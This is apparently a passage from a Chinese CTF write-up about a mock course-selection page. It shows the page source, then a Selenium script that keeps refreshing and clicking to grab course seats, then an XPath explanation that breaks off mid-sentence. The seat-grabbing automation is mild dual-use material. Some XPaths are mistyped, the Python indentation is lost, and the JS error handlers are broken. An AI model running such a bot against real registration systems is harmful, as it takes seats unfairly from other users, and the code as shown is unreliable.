class="string">&#x27;已选&#x27;</span> : <span class="string">&#x27;未选&#x27;</span>&#125;</span>&lt;/span&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    panelHeader.<span class="title function_">appendChild</span>(panelText);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> panelInfoContainer = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="property">className</span> = <span class="string">&#x27;panel-info-container display-none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> table = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;table&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> thead = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;thead&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    thead.<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;tr&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;课程名称&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;课程性质&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;上课时间&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;教学地点&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;已选/容量&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;th&gt;操作&lt;/th&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/tr&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> tbody = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;tbody&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> row = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;tr&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    row.<span class="property">innerHTML</span> = <span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;<span class="subst">$&#123;course.name&#125;</span>&lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;<span class="subst">$&#123;course.sort&#125;</span>&lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;<span class="subst">$&#123;course.time&#125;</span>&lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;<span class="subst">$&#123;course.location&#125;</span>&lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;<span class="subst">$&#123;course.is_full ? <span class="string">&#x27;已满&#x27;</span> : <span class="string">&#x27;未满&#x27;</span>&#125;</span>&lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">        &lt;button class=&quot;selector-button <span class="subst">$&#123;course.status ? <span class="string">&#x27;selected-button&#x27;</span> : <span class="string">&#x27;wait-select-button&#x27;</span>&#125;</span>&quot; onclick=&quot;selectCourse(<span class="subst">$&#123;course.id&#125;</span>)&quot;&gt;<span class="subst">$&#123;course.status ? <span class="string">&#x27;已选&#x27;</span> : <span class="string">&#x27;选课&#x27;</span>&#125;</span>&lt;/button&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">      &lt;/td&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">    `</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    tbody.<span class="title function_">appendChild</span>(row);</span></span><br><span class="line"><span class="language-javascript">    table.<span class="title function_">appendChild</span>(thead);</span></span><br><span class="line"><span class="language-javascript">    table.<span class="title function_">appendChild</span>(tbody);</span></span><br><span class="line"><span class="language-javascript">    panelInfoContainer.<span class="title function_">appendChild</span>(table);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    section.<span class="title function_">appendChild</span>(panelHeader);</span></span><br><span class="line"><span class="language-javascript">    section.<span class="title function_">appendChild</span>(panelInfoContainer);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    selectorContainer.<span class="title function_">appendChild</span>(section);</span></span><br><span class="line"><span class="language-javascript">  &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">selectCourse</span>(<span class="params">id</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/courses&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&quot;id&quot;</span>: id</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(data.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(data.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">TellAgu</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/ok&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(data.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(data.<span class="property">message</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">getCourses</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  * &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.red-text</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.display-none</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: none;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.display-flex</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">header</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: center; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">75rem</span> <span class="number">10rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: <span class="number">#0483d4</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#h1-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">white-space</span>: nowrap;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-size</span>: <span class="number">1.5rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-weight</span>: <span class="number">400</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#main-container</span>,</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#aside-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: center; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">10rem</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#aside-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">1rem</span> <span class="number">10rem</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">main</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: center; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.im-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: <span class="number">1.25rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: start; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: solid <span class="number">1px</span> <span class="number">#cce3e8</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#detail-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">1.25rem</span> <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">margin-bottom</span>: <span class="number">1.5rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: .<span class="number">8rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#f4f4f4</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-id">#selector-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.panel</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">flex-direction</span>: column;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: fit-content;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.panel-header</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">5rem</span> <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: .<span class="number">75rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.to-select</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#3c7895</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#d9edf7</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.selected</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#209820</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#c1ffc1</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.panel-info-container</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: center; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">75rem</span> <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">table</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">thead</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">2rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#f5f5f5</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: .<span class="number">75rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-bottom</span>: solid <span class="number">1px</span> <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">75rem</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: .<span class="number">75rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.selector-button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">25rem</span> .<span class="number">75rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: .<span class="number">75rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.wait-select-button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#337ab7</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.wait-select-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#a0a0a0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#1a456b</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.selected-button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#f0f0f0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#d9534f</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.selected-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#a0a0a0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#843534</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">aside</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">1rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">justify-content</span>: space-between; <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: <span class="number">1rem</span> sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.ok-button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">5rem</span> .<span class="number">75rem</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#337ab7</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css">  <span class="selector-class">.ok-button</span><span class="selector-pseudo">:active</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#a0a0a0</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="number">#1a456b</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>官方 wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">&quot;http://127.0.0.1:8000&quot;</span>)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">courses_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">course = &#123;</span><br><span class="line"><span class="string">&#x27;panel&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[1]&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[5]&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;submit&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[6]/button&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">courses_list.append(course)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(courses_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> courses_list:</span><br><span class="line">driver.refresh()</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> course <span class="keyword">in</span> courses_list:</span><br><span class="line">panel = driver.find_element(By.XPATH, course[<span class="string">&#x27;panel&#x27;</span>])</span><br><span class="line">panel.click()</span><br><span class="line">status_element = driver.find_element(By.XPATH, course[<span class="string">&#x27;status&#x27;</span>])</span><br><span class="line">status_text = status_element.text</span><br><span class="line"><span class="built_in">print</span>(status_text)</span><br><span class="line"><span class="keyword">if</span> status_text != <span class="string">&quot;已满&quot;</span>:</span><br><span class="line">submit_button = driver.find_element(By.XPATH, course[<span class="string">&#x27;submit&#x27;</span>])</span><br><span class="line">submit_button.click()</span><br><span class="line">WebDriverWait(driver, <span class="number">5</span>).until(EC.alert_is_present())</span><br><span class="line">alert = driver.switch_to.alert</span><br><span class="line"></span><br><span class="line">            alert.accept()</span><br><span class="line">courses_list.remove(course)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><p>解释一下这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">course = &#123;</span><br><span class="line"><span class="string">&#x27;panel&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selector-container&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[1]&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;status&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[5]&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;submit&#x27;</span>: <span class="string">f&#x27;//*[@id=&quot;selectorcontainer&quot;]/section[<span class="subst">&#123;i&#125;</span>]/div[2]/table/tbody/tr/td[6]/button&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、</strong> <code>f'//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]'</code></p><p>这段代码是一个 XPath 表达式，通常用于在 XML 或 HTML 文档中定位特定元素。</p><ul><li><p><code>//</code> : 这表示从文档的根节点开始，查找所有符合条件的元素。</p></li><li><p><code>*</code> : 通配符，表示匹配任何元素节点。</p></li><li><p><code>[@id=&quot;selector-container&quot;]</code> : 这部分表示选择具有 id 属性值为 &quot;selector-container&quot; 的元素。</p></li><li><p><code>/section</code> : 表示在前一步选择的元素中查找名为 &quot;section&quot; 的子元素。</p></li><li><p><code>[i]</code> : 这个部分是一个占位符，可能是用来代表某个具体的索引值，但在这里代码片段中缺少了具体的定义。一般来说，它会替换为一个整数值，以选择第 i 个匹配的元素。</p></li><li><p><code>/div[1]</code> : 表示在前一步选择的 section 元素中选择第一个 div 子元素。</p></li></ul><p>因此，这个 XPath 表达式的含义是：选择 id 为 &quot;selector-container&quot; 的元素下的第 i 个 section 元素中的第一个 div 子元素。</p><p><code>f'...'</code>  是一种格式化字符串的方式，被称为 f-string。在 f-string 中，可以直接在字符串中嵌入变量或表达式，并在运行时求值。在你的代码中， <code>f'//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]'</code>  中的 <code>&#123;i&#125;</code>  是一个占位符，表示在运行时会被变量 i 的值替换掉，这样就可以动态地构建 XPath 表达式。</p><p><strong>2、</strong> <code>'//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]'</code></p><p>这个 XPath 表达式用于定位 HTML 页面中的某个特定元素。</p><ul><li><code>//*[@id=&quot;selector-container&quot;]</code> : 从根节点开始，选择 id 属性为 &quot;selector-container&quot; 的元素。</li><li><code>/section[&#123;i&#125;]</code> : 在选中的元素中选择第 i 个 section 子元素。</li><li><code>/div[2]</code> : 在选中的 section 元素中选择第二个 div 子元素。</li><li><code>/table</code> : 在选中的 div 元素中选择 table 子元素。</li><li><code>/tbody</code> : 在选中的 table 元素中选择 tbody 子元素（如果存在）。</li><li><code>/tr</code> : 在选中的 tbody 元素中选择 tr 子元素。</li><li><code>/td[5]</code> : 在选中的 tr 元素中选择第五个 td 子元素。</li></ul><p>因此，这个 XPath 表达式的含义是：选择 id 为 &quot;selector-container&quot; 的元素下的第 i 个 section 元素中的第二个 div 子元素中的 table 元素中的 tbody 子元素中的第五个 td 子元素。</p><p><strong>3、</strong> <code>WebDriverWait(driver, 5).until(EC.alert_is_present())</code></p><p>这行代码使用了 Selenium 的 WebDriverWait 类来等待浏览器中出现一个警告框（alert）。具体来说：</p><ul><li><code>WebDriverWait(driver, 5)</code>  创建了一个 WebDriverWait 对象，指定了最长等待时间为 5 秒。这意味着程序将最多等待 5 